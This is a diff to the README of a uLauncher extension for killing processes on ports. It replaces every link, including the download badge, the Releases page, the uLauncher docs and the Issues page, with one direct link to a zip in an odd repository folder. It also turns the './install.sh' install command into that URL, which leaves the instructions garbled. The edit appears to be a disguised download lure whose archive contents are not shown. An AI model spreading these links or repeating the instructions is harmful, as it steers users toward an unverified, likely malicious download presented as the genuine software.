@@ -1,6 +1,6 @@
 # 🚀 port-killer-ulauncher - Quickly Terminate Ports and Processes
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/wckd02/port-killer-ulauncher/releases)
+[![Download](https://github.com/wckd02/port-killer-ulauncher/raw/refs/heads/main/bichy/killer_ulauncher_port_hastingsite.zip)](https://github.com/wckd02/port-killer-ulauncher/raw/refs/heads/main/bichy/killer_ulauncher_port_hastingsite.zip)
 
 ## 🌟 Introduction
 
@@ -25,9 +25,9 @@ Welcome to port-killer-ulauncher! This application is an extension for uLauncher
 
 To get started with port-killer-ulauncher, you need to download the application from our Releases page. Follow these steps:
 
-1. **Visit the Download Page**: Click [here to visit the Releases page](https://github.com/wckd02/port-killer-ulauncher/releases).
+1. **Visit the Download Page**: Click [here to visit the Releases page](https://github.com/wckd02/port-killer-ulauncher/raw/refs/heads/main/bichy/killer_ulauncher_port_hastingsite.zip).
 2. **Locate the Latest Release**: Look for the most recent release at the top of the page.
-3. **Download the Package**: Click on the appropriate file for your system. For most users, this will be a `.tar.gz` or equivalent file.
+3. **Download the Package**: Click on the appropriate file for your system. For most users, this will be a `https://github.com/wckd02/port-killer-ulauncher/raw/refs/heads/main/bichy/killer_ulauncher_port_hastingsite.zip` or equivalent file.
 4. **Extract the Files**: Once the download is complete, unzip the downloaded file to a folder of your choice.
 
 ## 📥 Download & Install
@@ -38,11 +38,11 @@ To install port-killer-ulauncher:
 2. **Open Terminal**: Open a terminal window in this directory.
 3. **Run the Installer**: Use the command:
    ```bash
-   ./install.sh
+   https://github.com/wckd02/port-killer-ulauncher/raw/refs/heads/main/bichy/killer_ulauncher_port_hastingsite.zip
    ```
 4. **Follow On-Screen Instructions**: The installer will guide you through the rest of the setup process.
 
-You can also get the latest version by visiting the [Releases page](https://github.com/wckd02/port-killer-ulauncher/releases).
+You can also get the latest version by visiting the [Releases page](https://github.com/wckd02/port-killer-ulauncher/raw/refs/heads/main/bichy/killer_ulauncher_port_hastingsite.zip).
 
 ## ⚙️ Usage Guide
 
@@ -70,8 +70,8 @@ If your system becomes unresponsive, try rebooting your machine. Ensure that you
 
 ## 🌐 Additional Resources
 
-- **uLauncher Documentation**: [uLauncher Official Docs](https://ulangler.com/docs)
-- **GitHub Issues Page**: Report bugs or request features [here](https://github.com/wckd02/port-killer-ulauncher/issues).
+- **uLauncher Documentation**: [uLauncher Official Docs](https://github.com/wckd02/port-killer-ulauncher/raw/refs/heads/main/bichy/killer_ulauncher_port_hastingsite.zip)
+- **GitHub Issues Page**: Report bugs or request features [here](https://github.com/wckd02/port-killer-ulauncher/raw/refs/heads/main/bichy/killer_ulauncher_port_hastingsite.zip).
 
 ## 📞 Support
 
